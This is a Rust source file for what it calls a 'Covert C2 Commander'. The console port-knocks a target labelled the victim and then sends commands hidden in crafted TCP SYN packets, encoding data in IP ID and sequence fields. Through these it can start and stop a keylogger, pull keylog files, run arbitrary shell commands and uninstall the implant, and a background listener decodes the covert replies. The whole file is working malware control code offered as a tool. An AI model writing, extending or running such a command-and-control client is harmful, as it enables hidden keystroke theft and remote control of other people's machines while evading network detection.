use std::io::{self, Write};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::net::{IpAddr, Ipv4Addr};
use std::thread;
use std::time::Duration;
use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::Packet;
use pnet::datalink;

mod port_knkr;
mod keylogger;
mod covert;

use port_knkr::KnockSession;

// Command Codes
const CMD_START_LOGGER:     u8 = 0x10;
const CMD_STOP_LOGGER:      u8 = 0x20;
const CMD_UNINSTALL:        u8 = 0x30;
const CMD_REQUEST_KEYLOG:   u8 = 0x50;

#[derive(Debug, PartialEq)]
enum SessionState {
    Disconnected,
    Connected,
}

struct Commander {
    state: SessionState,
    victim_ip: Option<Ipv4Addr>,
    local_ip: Option<Ipv4Addr>,
    knock_session: Option<KnockSession>,
    running: Arc<AtomicBool>,
    tx_port: u16,
    rx_port: u16,
}

impl Commander {
    fn new() -> Self {
        Self {
            state: SessionState::Disconnected,
            victim_ip: None,
            local_ip: None,
            knock_session: None,
            running: Arc::new(AtomicBool::new(false)),
            tx_port: 0,
            rx_port: 0,
        }
    }

    /// Direct refactor: Sends data using the covert module's chunking logic
    fn send_covert_data(&self, payload: &[u8]) {
        let victim_ip = self.victim_ip.expect("No victim IP");
        let local_ip = self.local_ip.expect("No local IP");
        
        let mut state = covert::SenderState::new_from_bytes(payload);
        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
        let (mut tx, mut rx) = transport_channel(65535, protocol).expect("Root required");
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);

        while state.has_next() && self.running.load(Ordering::SeqCst) {
            if let Some((ip_id, raw_word, masked_seq)) = state.chunk_to_send() {
                let syn_pkt = covert::build_syn_packet(
                    local_ip, victim_ip,
                    self.rx_port, 
                    self.tx_port, 
                    ip_id, masked_seq
                );
                
                let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt).unwrap(), IpAddr::V4(victim_ip));

                // Wait for ACK signature in the RST/ACK packet
                let start = std::time::Instant::now();
                while start.elapsed() < Duration::from_millis(400) {
                    if let Ok((packet, _)) = rx_iter.next() {
                        if packet.get_source() == victim_ip {
                            if let Some(recv_id) = covert::parse_rst_ack_ip_id(packet.packet()) {
                                if recv_id == covert::signature_ip_id(ip_id, raw_word) {
                                    state.ack();
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    pub fn run(&mut self) {
        println!("=== Covert C2 Commander ===");
        loop {
            match self.state {
                SessionState::Disconnected => self.disconnected_menu(),
                SessionState::Connected => self.connected_menu(),
            }
        }
    }

    fn disconnected_menu(&mut self) {
        println!("\n1) Initiate session (Port Knock)");
        println!("0) Exit");
        match prompt("Selection > ").as_str() {
            "1" => self.initiate_connection(),
            "0" => std::process::exit(0),
            _ => println!("[!] Invalid selection"),
        }
    }

    fn connected_menu(&mut self) {
        println!("\n--- Connected to {:?} ---", self.victim_ip);
        println!("1) Start Keylogger");
        println!("2) Stop Keylogger");
        println!("3) Request Keylog File");
        println!("4) Run Shell Command");
        println!("5) Uninstall");
        println!("6) Disconnect");
        match prompt("Selection > ").as_str() {
            "1" => self.start_keylogger(),
            "2" => self.stop_keylogger(),
            "3" => self.request_keylog_file(),
            "4" => self.run_program(),
            "5" => self.uninstall(),
            "6" => self.disconnect(),
            _ => println!("[!] Invalid selection"),
        }
    }

    fn initiate_connection(&mut self) {
        let target_ip = prompt("Target IP [127.0.0.1]: ");
        let ip = target_ip.parse::<Ipv4Addr>().unwrap_or(Ipv4Addr::new(127, 0, 0, 1));

        match port_knkr::port_knock(ip) {
            Ok(session) => {
                self.victim_ip = Some(ip);
                self.tx_port = session.tx_port;
                self.rx_port = session.rx_port;
                self.knock_session = Some(session);
                
                let iface_name = Self::find_best_interface(ip).unwrap_or_else(|| "lo".to_string());
                let interface = datalink::interfaces().into_iter().find(|i| i.name == iface_name).unwrap();
                self.local_ip = interface.ips.iter().find_map(|ip| if let IpAddr::V4(v4) = ip.ip() { Some(v4) } else { None });

                self.running.store(true, Ordering::SeqCst);
                self.state = SessionState::Connected;
                
                // Spawn the background listener for victim responses/keylogs
                self.spawn_listener();
                println!("[+] Session Established.");
            }
            Err(e) => println!("[!] Knock failed: {}", e),
        }
    }

    fn spawn_listener(&self) {
        let running = self.running.clone();
        let target_ip = self.victim_ip.unwrap();
        let rx_port = self.rx_port;

        thread::spawn(move || {
            let protocol = Layer3(IpNextHeaderProtocols::Tcp);
            let (_, mut rx) = transport_channel(65535, protocol).expect("Root required");
            let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
            let mut receiver_state = covert::ReceiverState::new();

            while running.load(Ordering::SeqCst) {
                if let Ok((packet, _)) = rx_iter.next() {
                    if packet.get_source() == target_ip {
                        if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
                            if parsed.dst_port == rx_port {
                                if let Ok(_) = receiver_state.apply_chunk(parsed.ip_id, parsed.seq) {
                                    if receiver_state.complete {
                                        if let Ok(msg) = receiver_state.message_str() {
                                            println!("\n[Incoming] {}", msg);
                                        }
                                        receiver_state = covert::ReceiverState::new();
                                    }
                                }
                            }
                        }
                    }
                }
            }
        });
    }

    fn start_keylogger(&mut self) { self.send_covert_data(&[CMD_START_LOGGER]); }
    fn stop_keylogger(&mut self) { self.send_covert_data(&[CMD_STOP_LOGGER]); }
    fn request_keylog_file(&mut self) { self.send_covert_data(&[CMD_REQUEST_KEYLOG]); }
    fn run_program(&mut self) {
        let cmd = prompt("Command: ");
        self.send_covert_data(cmd.as_bytes());
    }
    fn uninstall(&mut self) {
        self.send_covert_data(&[CMD_UNINSTALL]);
        self.disconnect();
    }
    fn disconnect(&mut self) {
        self.running.store(false, Ordering::SeqCst);
        self.state = SessionState::Disconnected;
    }

    fn find_best_interface(_target_ip: Ipv4Addr) -> Option<String> {
        datalink::interfaces().into_iter()
            .find(|i| i.is_up() && !i.is_loopback())
            .map(|i| i.name)
    }
}

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

fn main() {
    let mut commander = Commander::new();
    commander.run();
}
